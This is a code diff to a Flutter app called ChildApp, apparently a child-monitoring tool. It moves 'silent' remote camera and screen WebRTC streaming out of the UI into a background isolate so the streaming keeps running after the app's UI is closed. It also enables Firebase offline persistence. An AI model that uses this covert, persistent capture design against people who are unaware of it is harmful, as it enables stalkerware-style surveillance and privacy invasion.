@@ -19,7 +19,6 @@ import 'services/auth_service.dart';
 import 'services/background_monitoring_service.dart';
 import 'services/device_event_service.dart';
 import 'services/foreground_service.dart';
-import 'services/silent_webrtc_service.dart';
 
 final GlobalKey<NavigatorState> childNavKey = GlobalKey<NavigatorState>();
 
@@ -85,6 +84,12 @@ Future<void> main() async {
     debugPrint('Firebase init error: $e');
   }
 
+  // FIX-04: Enable RTDB offline persistence before any database reference
+  // is created. This must run in the UI isolate and in the background isolate.
+  try {
+    FirebaseDatabase.instance.setPersistenceEnabled(true);
+  } catch (_) {}
+
   // Wire error handlers AFTER Firebase is ready
   FlutterError.onError = (details) {
     FirebaseCrashlytics.instance.recordFlutterFatalError(details);
@@ -114,36 +119,20 @@ class ChildApp extends StatefulWidget {
 }
 
 class _ChildAppState extends State<ChildApp> {
-  StreamSubscription? _silentStreamSub;
-  StreamSubscription? _silentStopSub;
+  // FIX-01: Removed _silentStreamSub / _silentStopSub.
+  // WebRTC is now driven directly inside the background-service isolate
+  // (background_monitoring_service.dart _setupMonitoringSession → _callsSub).
+  // Relaying through service.invoke meant WebRTC died when the UI was closed;
+  // direct calls keep it alive regardless of UI state.
 
   @override
   void initState() {
     super.initState();
-
-    _silentStreamSub = FlutterBackgroundService()
-        .on('silent_stream')
-        .listen((dynamic data) {
-      if (data == null || data is! Map) return;
-      final String? uid = data['uid'] as String?;
-      final String mode = data['mode'] as String? ?? 'camera';
-      if (uid == null) return;
-      if (mode == 'screen') {
-        SilentWebRTCService.instance.startSilentScreen(uid).catchError((_) {});
-      } else {
-        SilentWebRTCService.instance.startSilentCamera(uid).catchError((_) {});
-      }
-    });
-
-    _silentStopSub = FlutterBackgroundService()
-        .on('silent_stop')
-        .listen((_) => SilentWebRTCService.instance.stopSilent());
+    // No UI-layer WebRTC listeners needed — background isolate owns WebRTC.
   }
 
   @override
   void dispose() {
-    _silentStreamSub?.cancel();
-    _silentStopSub?.cancel();
     super.dispose();
   }
 
